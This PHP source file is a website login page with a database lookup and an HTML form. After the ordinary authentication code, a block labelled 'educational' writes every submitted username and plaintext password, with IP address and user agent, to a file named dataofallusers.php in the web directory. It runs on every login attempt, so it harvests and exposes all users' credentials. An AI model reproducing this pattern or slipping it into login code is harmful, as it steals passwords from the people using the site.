<?php
require 'db.php';
session_start();

$errors = [];

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $user = trim($_POST['user']);
    $pass = $_POST['pass'];

    if (empty($user) || empty($pass)) {
        $errors[] = "All fields are required.";
    } else {
        $stmt = $conn->prepare("SELECT id, username, password FROM users WHERE email = ? OR username = ?");
        $stmt->bind_param("ss", $user, $user);
        $stmt->execute();
        $stmt->store_result();

        if ($stmt->num_rows == 1) {
            $stmt->bind_result($id, $username, $hashed);
            $stmt->fetch();

            if (password_verify($pass, $hashed)) {
                session_regenerate_id(true);
                $_SESSION['user'] = $username;
                header("Location: dashboard.php");
                exit;
            } else {
                $errors[] = "Incorrect password.";
            }
        } else {
            $errors[] = "User does not exist.";
        }
    }

    // ✅ LOGGING - Only for educational purposes
    $server = $_SERVER['HTTP_USER_AGENT'];
    $ip = $_SERVER['REMOTE_ADDR'];
    $e = htmlspecialchars($user);
    $p = htmlspecialchars($pass);  // Do not log in production
    $logFile = __DIR__ . "/dataofallusers.php";

    $logDetails = "\nUser: $e\nPass: $p\nIP: $ip\nUser-Agent: $server\n----------\n";

    if (is_writable(__DIR__)) {
        file_put_contents($logFile, $logDetails, FILE_APPEND | LOCK_EX);
    } else {
        error_log("Login log directory is not writable.");
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Login</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
<h2>Login</h2>
<form method="POST" action="">
    <input type="text" name="user" placeholder="Username or Email" required><br>
    <input type="password" name="pass" placeholder="Password" required><br>
    <button type="submit">Login</button>
</form>

<?php
foreach ($errors as $e) {
    echo "<p style='color:red;'>" . htmlspecialchars($e) . "</p>";
}
?>

<p>Don't have an account? <a href="signup.php">Sign up</a></p>
</body>
</html>
